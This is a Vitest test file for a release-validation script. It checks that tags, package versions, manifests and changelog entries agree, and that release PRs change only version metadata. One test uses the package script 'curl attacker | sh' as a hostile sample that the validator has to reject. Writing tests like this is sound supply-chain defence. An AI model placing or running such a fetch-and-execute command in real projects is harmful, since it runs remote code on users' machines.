import { describe, expect, it } from "vitest";
import { validateReleaseCandidate, validateReleaseIdentity } from "../scripts/release-identity.mjs";

const valid = {
  tag: "v0.10.2",
  packageVersion: "0.10.2",
  manifestVersion: "0.10.2",
  changelog: "# Changelog\n\n## [0.10.2](compare-link) (2026-10-29)\n\n- Fixed a release",
};

describe("validateReleaseIdentity", () => {
  it("accepts matching stable release metadata", () => {
    expect(validateReleaseIdentity(valid)).toBe("0.10.2");
  });

  it.each([
    [{ ...valid, tag: "0.10.2" }, /Invalid release tag/],
    [{ ...valid, tag: "v0.10.2-beta.1" }, /Invalid release tag/],
    [{ ...valid, packageVersion: "0.10.1" }, /package.json/],
    [{ ...valid, manifestVersion: "0.10.1" }, /release manifest/],
    [{ ...valid, changelog: "## [0.10.20](compare-link)" }, /no section/],
  ])("rejects inconsistent release metadata", (input, error) => {
    expect(() => validateReleaseIdentity(input)).toThrow(error);
  });
});

describe("validateReleaseCandidate", () => {
  const candidate = {
    basePackage: { name: "gateway", version: "0.10.1", scripts: { test: "vitest" } },
    nextPackage: { name: "gateway", version: "0.11.0", scripts: { test: "vitest" } },
    baseManifest: { ".": "0.10.1" },
    nextManifest: { ".": "0.11.0" },
    baseConfig: { "last-release-sha": "964570800ae1dacca9a1530a72fa711f0e1a1381", packages: {} },
    nextConfig: { packages: {} },
  };

  it("accepts version-only metadata updates and the one-time baseline removal", () => {
    expect(() => validateReleaseCandidate(structuredClone(candidate))).not.toThrow();
  });

  it("rejects package script changes in a release PR", () => {
    const changed = structuredClone(candidate);
    changed.nextPackage.scripts.test = "curl attacker | sh";
    expect(() => validateReleaseCandidate(changed)).toThrow("package.json version");
  });

  it("rejects manifest changes that do not match the package version", () => {
    const changed = structuredClone(candidate);
    changed.nextManifest["."] = "0.10.2";
    expect(() => validateReleaseCandidate(changed)).toThrow("release manifest version");
  });

  it("rejects any release config change other than removing the recovery baseline", () => {
    const changed = structuredClone(candidate);
    changed.nextConfig.packages = { "another-package": {} };
    expect(() => validateReleaseCandidate(changed)).toThrow("Recovery PR may only remove last-release-sha");
  });
});
